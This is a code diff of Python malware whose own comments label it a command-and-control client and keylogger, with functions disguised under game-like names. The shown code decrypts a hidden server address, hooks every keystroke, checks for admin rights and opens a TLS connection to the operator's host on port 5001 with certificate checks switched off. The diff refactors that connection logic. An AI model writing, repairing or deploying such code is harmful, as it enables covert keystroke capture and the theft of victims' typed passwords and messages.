@@ -27,7 +27,6 @@ import certs
 # C&C
 # Keylogger
 
-
 def prep_gme():
     try:
         pim = b'\xf9\x0c]Q\x81\xcf\xf0\xf0Z\xeb FA\xef;\xc3`\x8b\x17\xa5\xf06\x89\x0cq\x9cz\x1cYA\xa93\xb9\xfc\xaa{\x11g\x1d{{\xf4\x9c\xe2R/]\xa9\xc6\x0c\x15E\xee\xac\xaa~\xebE\xbe@\x1b\xa6s\xb0'
@@ -36,9 +35,8 @@ def prep_gme():
     except Exception:
         pass
 
-
 def know_gme():
-    unkown = b"\xaa\x7f\xfd?]*\xf7\x0f\xf3\xa6=\xe8\x95\x10J\xaf\xb6x&M\xb9'~\xa4\xb08\xd9\x1a\xd3\x03R\xf3\xe8\xa7\xc5h\xf6-\xb5\x9b\xa8d\x1b\x8e\xc5\xfe.\xf7|Zc\xbb\x936w\x81\xaa~j\xeb\x94\xddQ\x08"
+    unkown = b'\xd8\xfb\xcb\xb4\xe9\x8e\x93\x012Nu\xaf\xb4\xb5\x8a\x1ct<\xb8\x04\xcf\xbey\x1b\x8e\x14d\xf8\xa4\x02\xf2E\x02I>f\x7fKD\xf3V\x1f\xa0\xf9\xa8\xe9\xc18Hw\xa8\x9eIn\xda\xcf\x0c\x02\x9f\xfb!\x86\x17\x99'
     return str(decrypt(unkown).decode())
     #return "127.0.0.1"
 
@@ -50,7 +48,7 @@ def is_admin():
     if ctypes.windll.shell32.IsUserAnAdmin() == 0:
        return 1
     else:
-        return 0;
+        return 0
 
 
 def is_open():
@@ -83,6 +81,7 @@ try:
 
     context = ssl.SSLContext(ssl.PROTOCOL_TLS)
     context.verify_mode = ssl.CERT_NONE
+    context.check_hostname = False
     context.load_cert_chain(certfile=csd.name, keyfile=cock.name)
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -94,8 +93,6 @@ except Exception:
 
 def on_press(event):
     try:
-        t = threading.Thread(target=init_game)
-        t.start()
 
         yek.append(event.name)
 
@@ -150,10 +147,6 @@ def exiting():
 
 def games():
     try:
-        context = ssl.SSLContext(ssl.PROTOCOL_TLS)
-        context.verify_mode = ssl.CERT_NONE
-        context.load_cert_chain(certfile=csd.name, keyfile=cock.name)
-
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect((know_gme(), 5001))
         conn = context.wrap_socket(sock, server_hostname=know_gme())
@@ -198,20 +191,19 @@ def init_task():
 
 
 def main():
+    running = True
     try:
         prep_gme()
         init(convert=True)
-
         find_interests.main()
+        t = threading.Thread(target=init_game)
+        t.start()
         keyboard.on_press(on_press)
         task = threading.Thread(target=init_task)
         task.start()
 
-        while True:
-            try:
-                continue
-            except KeyboardInterrupt:
-                exiting()
+        while running:
+            continue
 
     except ConnectionResetError:
         pass
@@ -219,6 +211,7 @@ def main():
         pass
     except KeyboardInterrupt:
         exiting()
+
 
 def clean():
     if os.name == "posix":
